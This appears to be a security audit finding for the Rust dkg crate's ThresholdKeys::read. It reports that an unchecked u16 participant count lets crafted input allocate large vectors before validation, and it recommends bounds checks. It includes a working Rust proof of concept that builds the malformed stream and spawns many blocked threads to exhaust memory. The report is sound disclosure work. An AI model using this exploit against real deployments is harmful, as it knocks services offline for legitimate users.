### Title
Unbounded participant count enables per-request memory exhaustion during threshold-key deserialization - (File: crypto/dkg/src/lib.rs)

### Summary
`ThresholdKeys::read` trusts a serialized `u16` participant count before validating it, allowing each malformed or deliberately stalled input to allocate and populate up to 65,535 scalar elements and 65,535 verification-share entries. [1](#0-0) [2](#0-1) [3](#0-2) 

### Finding Description
The deserializer reads `t`, `n`, and `i` directly from the input stream, with `Participant::new` rejecting only participant index zero. [1](#0-0) [4](#0-3)  If the interpolation byte is `0`, it immediately executes `Vec::with_capacity(usize::from(n))` and reads `n` scalars before `ThresholdParams::new` is called. [5](#0-4) [6](#0-5)  Setting `t = n = u16::MAX` and `i = 1` passes the eventual parameter checks because `ThresholdParams::new` only rejects zero values, `t > n`, and `i > n`. [7](#0-6)  A 32-byte-scalar ciphersuite therefore creates a 2 MiB scalar vector, after which the parser reads another scalar and then inserts up to 65,535 attacker-supplied group elements into a `HashMap`. [8](#0-7) 

### Impact Explanation
An unprivileged party that can cause an application to call `ThresholdKeys::read` on untrusted bytes can make every request retain multiple megabytes while parsing continues or while the underlying `Read` implementation stalls. [9](#0-8) [2](#0-1)  Concurrent requests multiply this consumption and can exhaust allocator memory or trigger allocation failure, causing the hosting process to terminate or become unable to handle legitimate requests. [3](#0-2) 

### Likelihood Explanation
The attacker does not need a key share, proof, signature, or valid group elements before the large vector is populated; canonical zero scalars are sufficient to reach the blocking verification-share read. [10](#0-9) [11](#0-10)  The complete trigger is determined entirely by serialized fields accepted by the format, and no protocol limit lower than the `u16` maximum is enforced before allocation. [1](#0-0) [7](#0-6) 

### Recommendation
Validate `t`, `n`, and `i` with `ThresholdParams::new` before selecting the interpolation representation or allocating any collection. [1](#0-0) [12](#0-11)  Enforce an explicit maximum participant count and total serialized-key size appropriate for the protocol, reject `n` above that bound before `Vec::with_capacity` or the verification-share loop, and require callers to supply bounded or fully framed input rather than an indefinitely readable stream. [2](#0-1) [3](#0-2) 

### Proof of Concept
The following reader supplies the serialization prefix, enough canonical zero scalars to populate the entire interpolation vector, and then blocks while the function waits for the first verification-share encoding. [13](#0-12) [8](#0-7) 

```rust
use std::{io::{self, Cursor, Read}, thread};

use ciphersuite::Ciphersuite;
use dalek_ff_group::Ristretto;
use dkg::ThresholdKeys;

struct BlockingReader {
  inner: Cursor<Vec<u8>>,
}

impl Read for BlockingReader {
  fn read(&mut self, buf: &mut [u8]) -> io::Result<usize> {
    let read = self.inner.read(buf)?;
    if read == 0 {
      loop {
        thread::park();
      }
    }
    Ok(read)
  }
}

fn attack_stream() -> BlockingReader {
  const N: usize = u16::MAX as usize;

  let mut bytes = Vec::new();
  bytes.extend(u32::try_from(<Ristretto as Ciphersuite>::ID.len()).unwrap().to_le_bytes());
  bytes.extend(<Ristretto as Ciphersuite>::ID);
  bytes.extend(u16::MAX.to_le_bytes()); // t
  bytes.extend(u16::MAX.to_le_bytes()); // n
  bytes.extend(1u16.to_le_bytes());     // i
  bytes.push(0);                        // Interpolation::Constant

  // Populate all 65,535 interpolation scalars plus the secret share.
  bytes.extend(vec![0; N * 32]);
  bytes.extend([0; 32]);

  // The next read is the first verification share and blocks forever.
  BlockingReader { inner: Cursor::new(bytes) }
}

fn exhaust_memory() {
  for _ in 0 .. 512 {
    thread::spawn(|| {
      let mut reader = attack_stream();
      // Each blocked call retains a 2 MiB interpolation vector.
      let _ = ThresholdKeys::<Ristretto>::read(&mut reader);
    });
  }

  loop {
    thread::park();
  }
}
```
